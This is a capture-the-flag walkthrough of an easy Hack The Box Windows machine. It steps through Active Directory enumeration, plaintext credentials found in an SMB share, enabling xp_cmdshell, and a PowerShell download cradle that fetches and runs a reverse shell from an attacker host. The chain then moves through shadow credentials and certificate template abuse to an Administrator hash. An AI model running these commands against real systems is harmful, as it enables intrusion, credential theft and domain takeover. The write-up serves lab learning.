I was doing the box again cleaning up my notes, if you're messing up or missing something maybe this will help  
It is an easy box so have at it fo' free  
  
I may have copied something down wrong its just cleaned up notes so lemm know....  
  
[ Start! ]  
As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su  
  
[https://jumpshare.com/viewer/xlsx](https://jumpshare.com/viewer/xlsx) <----- keep this in mind  
  
  
// export variables like ip pass and such to make life easy.....  
// First things first we got creds sooo python bloodhound!  
// Get everything from Rose's perspective it may be overkill on an easy, it may not be...  
  
$ bloodhound-python -d sequel.htb -v --zip -c ALL -u rose -p KxEPkKe6R8su -d sequel.htb -dc dc01.sequel.htb -ns ${ip}  
  
// This may be something that you need to do for SMB idk....  
  
edit /etc/samba/smb.conf  
  
Add the following under global:  
  client min protocol = CORE  
  client max protocol = SMB3  
  
  
  
/* gobuster dns to find the DC */  
  
──(kali㉿Senbonzakura)-[~/escape]  
$ gobuster dns -d sequel.htb -w ~/lists/onlyfansubs-top10000.txt -r sequel.htb:53  
  
  
Found: forestdnszones.sequel.htb  
                                                                                 
Found: domaindnszones.sequel.htb  
                                                                                 
Found: dc01.sequel.htb  
  
  
// enumerate users with netexec....  
  
[make userlist ]  
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ netexec smb sequel.htb -p ${pass} -u rose --rid-brute |tee output.txt  
  
SMB                      10.129.38.68    445    DC01             
[*]Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)  
SMB                      10.129.38.68    445    DC01            [+] sequel.htb\rose:KxEPkKe6R8su  
SMB                      10.129.38.68    445    DC01            498: SEQUEL\Enterprise Read-only Domain Controllers (SidTypeGroup)  
SMB                      10.129.38.68    445    DC01            500: SEQUEL\Administrator (SidType  
  
<snip>-------------------------------------------------------------------------</snip>  
  
//Now make the output.txt into a useable userlist  
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ grep -oP '(?<=SEQUEL\\)[^ ]+' output.txt > usernames.txt  
  
//Nothing...  
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ netexec ldap sequel.htb -u rose -p ${pass} --users             
SMB        10.129.69.181  445    DC01             
[*]Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)  
LDAP        10.129.69.181  389    DC01            [+] sequel.htb\rose:KxEPkKe6R8su  
LDAP        10.129.69.181  389    DC01             
[*]Enumerated 9 domain users: sequel.htb  
LDAP        10.129.69.181  389    DC01            -Username-                    -Last PW Set-      -BadPW- -Description-                                               
LDAP        10.129.69.181  389    DC01            Administrator                2024-06-08 16:32:20 2      Built-in account for administering the computer/domain       
LDAP        10.129.69.181  389    DC01            Guest                        2024-12-25 14:44:53 2      Built-in account for guest access to the computer/domain     
LDAP        10.129.69.181  389    DC01            krbtgt                        2024-06-08 16:40:23 2      Key Distribution Center Service Account                     
LDAP        10.129.69.181  389    DC01            michael                      2024-06-08 16:47:37 2                                                                   
LDAP        10.129.69.181  389    DC01            ryan                          2024-06-08 16:55:45 2                                                                   
LDAP        10.129.69.181  389    DC01            oscar                        2024-06-08 16:56:36 2                                                                   
LDAP        10.129.69.181  389    DC01            sql_svc                      2024-06-09 07:58:42 2                                                                   
LDAP        10.129.69.181  389    DC01            rose                          2024-12-25 14:44:54 16                                                                   
LDAP        10.129.69.181  389    DC01            ca_svc                        2025-01-11 19:52:29 2  
  
  
  
  
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ smbclient -L \\\\sequel.htb -U rose  
Password for [WORKGROUP\rose]:  
  
        Sharename      Type      Comment  
        ---------      ----      -------  
        Accounting Department Disk       
        ADMIN$          Disk      Remote Admin  
        C$              Disk      Default share  
        IPC$            IPC      Remote IPC  
        NETLOGON        Disk      Logon server share  
        SYSVOL          Disk      Logon server share  
        Users          Disk       
Reconnecting with SMB1 for workgroup listing.  
do_connect: Connection to sequel.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)  
Unable to connect with SMB1 -- no workgroup available  
                                                                                                                                                                                                                                                                                                     
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ smbclient \\\\sequel.htb\\Users -U rose   
Password for [WORKGROUP\rose]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
  .                                  DR        0  Sun Jun  9 09:42:11 2024  
  ..                                DR        0  Sun Jun  9 09:42:11 2024  
  Default                          DHR        0  Sun Jun  9 07:17:29 2024  
  desktop.ini                      AHS      174  Sat Sep 15 03:16:48 201  
  
  
// ehhhh nothing but password policies....this is important later!!!!!!  
//Or maybe that was ldapdomaindump....  
smbclient \\\\sequel.htb\\SYSVOL -U rose  
  
  
// Okay this one is the juicy one  
  
┌──(kali㉿Senbonzakura)-[~/escape/accounting]  
└─$ smbclient \\\\sequel.htb\\"Accounting Department" -U rose  
  
smb: \> prompt off  
smb: \> recurse on  
smb: \> mget *  
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (15.8 KiloBytes/sec) (average 15.8 KiloBytes/sec)  
getting file \accounts.xlsx of size 6780 as accounts.xlsx (10.6 KiloBytes/sec) (average 13.2 KiloBytes/sec)  
  
//UNZIP  
//or use this deally from the internets for xlxsx viewerrererr its quicker  
[https://jumpshare.com/viewer/xlsx](https://jumpshare.com/viewer/xlsx)  
  
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ unzip accounts.xlsx -d accounts  
  
  
Angela Martin angela@sequel.htb angela 0fwz7Q4mSpurIt99  
Oscar Martinez oscar@sequel.htb oscar 86LxLBMgEWaKUnBG  
Kevin Malone kevin@sequel.htb kevin Md9Wlq1E5bZnVDVo  
NULL NULL sa@sequel.htb sa MSSQLP@ssw0rd!  
  
//Its obviously the MySQL shit because of the nmap results....  
  
  
  
xlsx1--------------------------------------  
Angela Martin angela@sequel.htb angela 0fwz7Q4mSpurIt99  
Oscar Martinez oscar@sequel.htb oscar 86LxLBMgEWaKUnBG  
Kevin Malone kevin@sequel.htb kevin Md9Wlq1E5bZnVDVo  
NULL NULL sa@sequel.htb sa MSSQLP@ssw0rd!  <---- sa is interesting for sql  
  
xlsx2-------------------------------------  
  
  
Date Invoice Number Vendor Description Amount Due Date Status Notes  
9/6/2024 1001 Dunder Mifflin Office Supplies 150$ 01/15/202 Paid  
23/08/2024 1002 Business Consultancy Consulting 500$ 01/30/202 Unpaid Follow up  
7/10/2024 1003 Windows Server License Software 300$ 02/05/202 Paid  
  
---------------------------------------  
  
[ SQL -> sql_svc ]  
  
// okay sooo we know sa above will work and thus need to enable xp_cmshell to get anywhere....  
// I like using a nishang shell if AV is off if,  easier imo  
// Or use the revshells.com powershell #3 b64 and powershell -enc b64-payload if you go that route....  
// setup a python server to serve if you go shell route...  
  
  
//using files...we got creds..for whatever reason no windows auth!!!!  
// 0...Set up lisetener (and maybe python server)  
// 1...enable xp cmdshell  
// 2..shell  
  
// See below for steps...  
  
//rose is a no go she can't execute cmdshell shit  
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ mssqlclient.py rose@sequel.htb -windows-auth  
  
  
//I used nishang shell, it was there and easy, but revshells.com works with powershell#3 b64  
──(kali㉿Senbonzakura)-[~/escape/accounts]  
└─$ impacket-mssqlclient sa@sequel.htb  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
Password:  
[*]Encryption required, switching to TLS  
[*]ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*]ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*]ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*]INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.  
[*]INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.  
[*]ACK: Result: 1 - Microsoft SQL Server (150 7208)  
[!] Press help for extra shell commands  
SQL (sa  dbo@master)> EXEC sp_configure 'show advanced option', '1';  
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.  
SQL (sa  dbo@master)> RECONFIGURE  
SQL (sa  dbo@master)>  
SQL (sa  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1  
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.  
SQL (sa  dbo@master)> RECONFIGURE  
SQL (sa  dbo@master)> EXEC xp_cmdshell 'powershell -NoProfile -ExecutionPolicy Bypass -Command "& {IEX(New-Object Net.WebClient).DownloadString(''http://10.10.xx.xx:8000/Invoke-PowerShellTcp.ps1'')}"''  
  
MSSQLP@ssw0rd!  
  
  
/* if you use this I think I said have python3 simple server running....payload is limited by imagination, mine was thinking fast and loud */  
  
The xp_cmdshell thing...  
#########  
EXEC sp_configure 'show advanced option', '1';  
RECONFIGURE  
  
EXECUTE sp_configure 'xp_cmdshell', 1  
RECONFIGURE  
  
  
EXEC xp_cmdshell 'powershell -NoProfile -ExecutionPolicy Bypass -Command "& {IEX(New-Object Net.WebClient).DownloadString(''http://10.10.xx.xx:8000/Invoke-PowerShellTcp.ps1'')}"'  
##########  
  
  
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: [sql_svc]::::::::::::::::::::::  
PS C:\Windows\system32> whoami /all  
  
// Look around filesystem its easy to find, the SQL2019 directory was enticing.....kinda a trail of breadcrumbs from C:\  
  
PS C:\SQL2019\ExpressAdv_ENU> cat PackageId.dat  
`???#k?A?vof??jD  
PS C:\SQL2019\ExpressAdv_ENU> cat AUTORUN.INF  
[autorun]  
OPEN=SETUP.EXE  
ICON=SETUP.EXE,0  
PS C:\SQL2019\ExpressAdv_ENU> cat sql-Configuration.INI  
[OPTIONS]  
ACTION="Install"  
QUIET="True"  
FEATURES=SQL  
INSTANCENAME="SQLEXPRESS"  
INSTANCEID="SQLEXPRESS"  
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"  
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"  
AGTSVCSTARTUPTYPE="Manual"  
COMMFABRICPORT="0"  
COMMFABRICNETWORKLEVEL=""0"  
COMMFABRICENCRYPTION="0"  
MATRIXCMBRICKCOMMPORT="0"  
SQLSVCSTARTUPTYPE="Automatic"  
FILESTREAMLEVEL="0"  
ENABLERANU="False"  
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"  
SQLSVCACCOUNT="SEQUEL\sql_svc"  
SQLSVCPASSWORD="WqSZAF6CysDQbGb3" <--------------------------- NEW PASSWD!!!! NXC to see what is it...  
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"  
SECURITYMODE="SQL"  
SAPWD="MSSQLP@ssw0rd!"            <--------------------------- We already have this....  
ADDCURRENTUSERASSQLADMIN="False"  
TCPENABLED="1"  
NPENABLED="1"  
BROWSERSVCSTARTUPTYPE="Automatic"  
IAcceptSQLServerLicenseTerms=True  
PS C:\SQL2019\ExpressAdv_ENU>  
  
  
// test for user passwd  
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ netexec winrm sequel.htb -u usernames.txt  -p 'WqSZAF6CysDQbGb3'  --continue-on-success  
  
WINRM      10.129.69.181  5985  DC01            [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)  
  
//Okay we got a user and a winrm shell.....  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\ryan\Documents> type C:\Users\ryan\Desktop\user.txt  
abd54955ad5ec2b7b60f67*******  
*Evil-WinRM* PS C:\Users\ryan\Documents>  
  
  
######### Bloodhound anal-sis#########  
Now run .\SharpHound.exe or use bloodhound.py to get it.....  
// keep adding data to the graph  
  
  
bloodhound-python -d sequel.htb -v --zip -c ALL -u ryan -p WqSZAF6CysDQbGb3 -d sequel.htb -dc dc01.sequel.htb -ns ${ip}  
  
  
  
// * may need to chain commands together using ; or redo some ....play around with commands a bit */  
  
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan  
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc  
  
/* must chain commands .....possibly all of the first 3, try what works, its reminiscent of certified, look back at that */  
  
//chain all these 3 together just to be sure...  
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan;dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'  
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc  
/home/kali/.local/bin/dacledit.py:101: SyntaxWarning: invalid escape sequence '\V'  
  
[*]DACL backed up to dacledit-20250111-185257.bak  
[*]DACL modified successfully!  
  
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip ${ip} -ns ${ip} -target dc01.sequel.htb -account ca_svc  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*]Targeting user 'ca_svc'  
[*]Generating certificate  
[*]Certificate generated  
[*]Generating Key Credential  
[*]Key Credential generated with DeviceID '7e3f02bf-d49d-73d5-337a-8a5c3fe9503a'  
[*]Adding Key Credential with device ID '7e3f02bf-d49d-73d5-337a-8a5c3fe9503a' to the Key Credentials for 'ca_svc'  
[*]Successfully added Key Credential with device ID '7e3f02bf-d49d-73d5-337a-8a5c3fe9503a' to the Key Credentials for 'ca_svc'  
[*]Authenticating as 'ca_svc' with the certificate  
[*]Using principal: ca_svc@sequel.htb  
[*]Trying to get TGT...  
[*]Got TGT  
[*]Saved credential cache to 'ca_svc.ccache'  
[*]Trying to retrieve NT hash for 'ca_svc'  
[*]Restoring the old Key Credentials for 'ca_svc'  
[*]Successfully restored the old Key Credentials for 'ca_svc'  
[*]NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce  
  
// Now we got a hash and a ccache  
  
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip ${ip} -vulnerable -stdout  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
  
// This output looks important....probably should read it all....  
<snip>----------------------------------------------------------</snip>  
  
    Enroll                          : SEQUEL.HTB\Authenticated Users  
Certificate Templates  
  0  
    Template Name                      : DunderMifflinAuthentication  
    Display Name                        : Dunder Mifflin Authentication  
    Certificate Authorities            : sequel-DC01-CA  
    Enabled                            : True  
    Client Authentication              : True  
  
<important>-------------------------------------------------</important>  
  
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip ${ip}  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*]Updating certificate template 'DunderMifflinAuthentication'  
[*]Successfully updated 'DunderMifflinAuthentication'  
  
//be quick cleanup scrip  
//retry and or chain them if it doesn't work....  
  
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ certipy-ad req -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip ${ip} -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns ${ip} -dns ${ip}  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*]Requesting certificate via RPC  
[*]Successfully requested certificate  
[*]Request ID is 7  
[*]Got certificate with multiple identifications  
    UPN: 'Administrator@sequel.htb'  
    DNS Host Name: '10.129.xx.xxx'  
[*]Certificate has no object SID  
[*]Saved certificate and private key to 'administrator_10.pfx'  
  
//This one I might fail so again retry and maybe chain...whatever works....  
                                                                                                                                                                                                       
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ certipy-ad auth -pfx administrator_10.pfx -dc-ip ${ip}  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*]Found multiple identifications in certificate  
[*]Please select one:  
    [0] UPN: 'Administrator@sequel.htb'  
    [1] DNS Host Name: '10.129.xx.xxx'  
> 0  
[*]Using principal: administrator@sequel.htb  
[*]Trying to get TGT...  
[*]Got TGT  
[*]Saved credential cache to 'administrator.ccache'  
[*]Trying to retrieve NT hash for 'administrator'  
[*]Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e*************  
  
//sweet the hash works!  
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ nxc smb sequel.htb -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f***********'  
SMB        10.129.xx.xxx    445    DC01             
[*]Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)  
SMB        10.129.xx.xx    445    DC01            [+] sequel.htb\administrator:7a8d4e04986afa8ed4060f75e5a0b3ff (Pwn3d!)  
  
// can we use winrm for shell?  
┌──(kali㉿Senbonzakura)-[~/escape]  
└─$ nxc winrm sequel.htb -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed***************'  
WINRM      10.129.38.68    5985  DC01             
[*]Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.  
  arc4 = algorithms.ARC4(self._key)  
WINRM      10.129.xx.xx    5985  DC01            [+] sequel.htb\administrator:7a8d4e04986afa8ed4*********  (Pwn3d!)  
  
  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt  
9b6d19141356159bb01c33ae506f****  
  
  
Yaaaaaay (Pwn3d!)